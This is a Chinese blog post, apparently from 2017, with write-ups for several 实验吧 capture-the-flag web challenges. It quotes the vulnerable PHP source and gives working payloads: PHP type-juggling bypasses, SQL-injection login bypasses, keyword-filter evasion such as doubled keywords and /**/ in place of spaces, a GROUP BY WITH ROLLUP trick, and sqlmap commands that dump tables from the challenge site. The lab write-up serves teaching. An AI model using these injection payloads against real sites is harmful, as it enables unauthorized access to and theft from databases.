---
title: 实验吧决斗场Writeup
date: 2017-04-20 12:23:05
tags: 
- CTF
- Writeup
categories: 
- CTF
---

### 00x1 到底是不是number呢？

首先抓包看流量，看到Response包里有个
![](http://oohnuejim.bkt.clouddn.com/%E5%88%B0%E5%BA%95%E6%98%AF%E4%B8%8D%E6%98%AFnumber%E5%91%A2.png)

打开这个目录，得到原码
分析原码
<!--more-->
```  PHP 
<?php

$info = "";
$req = [];   //数组
$flag="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

ini_set("display_error", false);
error_reporting(0);           //关闭错误报告

if(!isset($_GET['number'])){
   header("hint:26966dc52e85af40f59b4fe73d8c323a.txt"); //发送http头

   die("have a fun!!");

}

foreach([$_GET, $_POST] as $global_var) { //把get或者post进去的值取做全局var
    foreach($global_var as $key => $value) { //字符串的键值自动变成下标
        $value = trim($value); //把value两边的空格啥的去掉
        is_string($value) && $req[$key] = addslashes($value);//if(is_string)成立则把value中的双引号前加\赋值给
    }
}

function is_palindrome_number($number) {     //判断是不是回文数字
    $number = strval($number);                        //把数字的字符串值传给number
    $i = 0;
    $j = strlen($number) - 1;
    while($i < $j) {
        if($number[$i] !== $number[$j]) {
            return false;
        }
        $i++;
        $j--;
    }
    return true;
}

if(is_numeric($_REQUEST['number'])){                  //检测是否为是数字字符串，不是则报错

   $info="sorry, you cann't input a number!";

}elseif($req['number']!=strval(intval($req['number']))){ //

     $info = "number must be equal to it's integer!! ";

}  
else{  

     $value1 = intval($req["number"]);
     $value2 = intval(strrev($req["number"]));

     if($value1!=$value2){
          $info="no, this is not a palindrome number!";
     }else{

          if(is_palindrome_number($req["number"])){
              $info = "nice! {$value1} is a palindrome number!";
          }else{
             $info=$flag;
          }
     }

}

echo $info;

  
```

首先你GET或者POST进去的参数必须是字符型数字，想到用unicode码 %20 空格 和%00 来让它变成字符型数字，最后还要确定输入的字符型数字不为回文，看到网上的思路 0e-0可一用来绕过。


### 00x2 登陆一下好吗？

这道题你随便输入写什么，他都会跳给你一个页面，比如说我在账号里输入一个a
我猜测它存在SQL注入

尝试一下万能密码
admin' or '1'='1

万能密码原理：
在SQL语言中 and优先于or
 not and or 
所以逻辑从先or  再and 变成了   先and 再or
or前后2个条件只要有一个成立就行了
![](http://oohnuejim.bkt.clouddn.com/%E7%99%BB%E9%99%86%E4%B8%80%E4%B8%8B%E5%A5%BD%E5%90%972.png)


回到这道题上，放入万能密码后
![](http://oohnuejim.bkt.clouddn.com/%E7%99%BB%E9%99%86%E4%B8%80%E4%B8%8B%E5%A5%BD%E5%90%973.png)
明显过滤了or，那么‘or’的万能密码就不能用了，只能重新构造。
看看还过滤了什么
![](http://oohnuejim.bkt.clouddn.com/%E7%99%BB%E9%99%86%E4%B8%80%E4%B8%8B%E5%A5%BD%E5%90%974.png)

猜测
原语句应该为 select * from user where username='' and password=''

当提交username=pcat'='&password=pcat'='
语句会变成如下：
select * from user where username='pcat'='' and password='pcat'=''
这时候还不够清晰，我提取前一段判断出来（后面的同样道理）
username='pcat'=''
这是有2个等号，然后计算顺序从左到右，
先计算username='pcat' 一般数据库里不可能有我这个小名（若有，你就换一个字符串），所以这里返回值为0（相当于false）
然后0='' 这个结果呢？看到这里估计你也懂了，就是返回1（相当于true）

其实就是个php弱类型比较，让我(ˇ?ˇ) 想我还真的想不到这种方法。

说白了这道题也就过滤了一个 or --让你没法注释，还有一般的万能密码。





### 00x3 因垂丝汀的绕过

在源码注释看到了source.txt，打开发现原码

```PHP
<?php
error_reporting(0);

//前端页面
if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
        echo '<form action="" method="post">'."<br/>";
        echo '<input name="uname" type="text"/>'."<br/>";
        echo '<input name="pwd" type="text"/>'."<br/>";
        echo '<input type="submit" />'."<br/>";
        echo '</form>'."<br/>";
        echo '<!--source: source.txt-->'."<br/>";
    die;
}

//一个过滤函数
function AttackFilter($StrKey,$StrValue,$ArrReq){ 
    if (is_array($StrValue)){
        $StrValue=implode($StrValue); //implode函数是将 一位数组转化为字符串
    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){ 
        print "水可载舟，亦可赛艇";
        exit();
    }
}

$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){
    AttackFilter($key,$value,$filter);
}

$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");
if (!$con){
        die('Could not connect: ' . mysql_error());
}
$db="XXXXXX";
mysql_select_db($db, $con);
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql);
if (mysql_num_rows($query) == 1) {
    $key = mysql_fetch_array($query);
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇";
    }
}else{
        print "一颗赛艇！";
}
mysql_close($con);
?>
```

这个代码不复杂，就是查询一个是否存在数据库中的 数据，如果账户密码相同则输出flag，账户相同密码不同则输出 “一颗赛艇”，注意下mysql_num_rows作用是取得结果集中行的数目，表示取得uname是否存在。
这个代码先把post上去的数据中“and|select|from|where|union|join|sleep|benchmark|”全部去除，所以基本上一般的注入不可行。但是他没有过滤or，所以感觉可以构造万能密码类似的playload来绕过 mysql_num_rows($query) == 1
palayload:   
uname=admin' or 1=1#&pwd=
一颗赛艇
结果集中只取一个，所以加上limit限制
playload:
uname=admin' or 1=1 limit 1#&pwd=
亦可赛艇

现在不知道密码，看到是 == ，弱类型，一开始想的是用 pwd[]=来绕过，但是上面已经用过数组直接转换为字符型了，所以不行。
看网上的wp，说利用 group by with rollup来绕过，这个with rollup来改善统计性能的 。
-mysql> select dep,pos,avg(sal) from employee group by dep,pos with rollup;
+------+------+-----------+
 | dep | pos | avg(sal) |
+------+------+-----------+
 | 01 | 01 | 1500.0000 |
 | 01 | 02 | 1950.0000 |
 | 01 | NULL | 1725.0000 |
 | 02 | 01 | 1500.0000 |
 | 02 | 02 | 2450.0000 |
 | 02 | NULL | 2133.3333 |
 | 03 | 01 | 2500.0000 |
 | 03 | 02 | 2550.0000 |
 | 03 | NULL | 2533.3333 |
 | NULL | NULL | 2090.0000 |
 +------+------+-----------+
其实就是多出一行来统计类似平均数的，可以利用的点就是group by 后面的字段在最后一行是NULL，所以就是利用到题目上就是NULL=空字符串
playload:
uname=admin' or 1=1 group by pwd with rollup limit 1 offset 2#&pwd=
至于为什么是第3条数据，这个就是一个个猜出来的。

offset是来代替“，”的，但是意思有所区别。
![](http://oohnuejim.bkt.clouddn.com/%E5%9B%A0%E5%9E%82%E4%B8%9D%E6%B1%80%E7%9A%84%E7%BB%95%E8%BF%87.png)
limit 1 offset 2 是取到2，而limit1，2是取2个。


### 00x4 简单的sql注入

我做sql注入题目的一般思路


1. 判断有没有读写权限
2. 判断注入点
3. 查出基本信息
4. 爆表爆列爆用户名密码

做这道题目的时候，下意识的查看了一下原码，发现表单那里post上去的字段名是id，那么联想到sqllab了。
输入数值1返回结果：  

> ID: 1  
> name: baloteli

在输入1\：
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1\'' at line 1

可见输入的是字符型，注入点存在，and 1 2一下，
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1=1+'' at line 1    

说明好像过滤掉了些东，fuzz测试一下（模糊测），输入
> 1 and or where union select database() sleep() information_schema schemata column from # --
  
返回结果：

> ID: 1 or where  
> name: baloteli

从id项看出有几个已经被过滤掉了，而且是直接把关键字给去掉，那么可以用类似ab(abc)c来绕过过滤，abc是要绕过的关键字，使用时不加括号，这里加括号只是为了区分，也就是过滤了select，那么我在select周围加了一个select不就行了，selecselectt，把里面select过滤了，外面的selec 和t组合一下就是一个select。

- 开始爆一下一些基本信息
> id=1' ununionion seselectlect database() frofromm information_schema.schemata wherwheree '1'='1  
> 
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'seselectlect database() frofromm information_schema.schemata wherwheree '1'='1'' at line 1
  
看到出错的信息还是这样，没有union那几个关键词没有过滤掉，还是哪里出现了问题，思路应该是没有问题的，我看了一看浏览器的url，发现。。。里面关键词前面有个+号，过滤了空格，坑死爹了。那么更改plagload:

> id=1'+ununionion+seselectlect+database()+frofromm+information_schema.schemata+wherwheree+'1'='1  

还是上面的错误，那么多加个空格呢
> id=1' +ununionion +seselectlect +database() +frofromm +information_schema.schemata +wherwheree +'1'='1  
  
还是不行
全换成空格呢(注意是2个空格，有可能hexo主题的原因把我的空格吃了)

> id=1'  ununionion  seselectlect  database()  frofromm  information_schema.schemata  wherwheree  '1'='1  
  
发现。。。ab(abc)c这样的形式不行，换成abcabc这样的形式，发现可以，具体的我也不清楚,有可能是正则的问题。  


> id=1'  unionunion  selectselect  database()  fromfrom  information_schema.schemata  wherewhere  '1'='1


> ID: 1' union select database() from information_schema.schemata where '1'='1  
> name: baloteli  
> ID: 1' union select database() from information_schema.schemata where '1'='1  
> name: web1

那么其他的都是简单操作了
不再一一操作上playload了
除了。。。在爆列名的时候，又过滤了column_name和information_schema.columns以外就没什么  


> id=1'  unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns wherewhere  table_name='flag

这个也很奇怪，有的时候需要用到abcabc的形式，有的时候要用到ab(abc)c


### 00x5 简单的sql注入2

答题思路大体上都是那样。这里有一些不一样，就是检测到空格和一些其他关键字就直接die("SQLi detected")，不知道后台是否存在关键词的替代。    
根据wp的猜测  
~~~  PHP
for_each ($query_list as $value) {  
	if (in_array($value,$filter_array)) {  
		die("SQLi detected") ;

~~~
就是直接检测是否存在这些关键词，有的话直接输出这个SQLi detected。替换就跟上面那个一样多加一层。  
于是就测试一下。  
先输入 1\，还是字符型。  
那么加个几个关键词   
1' and '1'='1  
SQLi detected  
不知道是and还是其他北过滤了，把and去掉，改成1'='1，进去了，改成1'and，没有空格，发现了空格在那个过滤数组中，那么绕过空格，把每一个 空格都替换成/**/，(因为HTML语法和md语法的原因我的*被吃了，所以补上playload了)  
![](http://oohnuejim.bkt.clouddn.com/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A52.png)

剩下的就没什么了。


### 00x6 简单的sql注入3

手注没有注入出来，他说是报错注入。。。然后我就傻乎乎地用那几个报错函数死命的注入。。。最后回显一个don't。。。看来只能盲注了。盲注手工太麻烦了。。。直接上sqlmap

判断注入点  
> sqlmap -u "http://ctf5.shiyanbar.com/web/index_3.php?id=1"

判断数据库  
> sqlmap -u "http://ctf5.shiyanbar.com/web/index_3.php?id=1" --dbs

判断表名  
> sqlmap -u "http://ctf5.shiyanbar.com/web/index_3.php?id=1"  --tables

判断字段名  
> sqlmap -u "http://ctf5.shiyanbar.com/web/index_3.php?id=1" -T "表名" --columns

查内容  
> sqlmap -u "http://ctf5.shiyanbar.com/web/index_3.php?id=1"  --dump  -T "flag" -C "flag"


以后做到哪，这篇博客就跟到哪。。。哈哈哈~



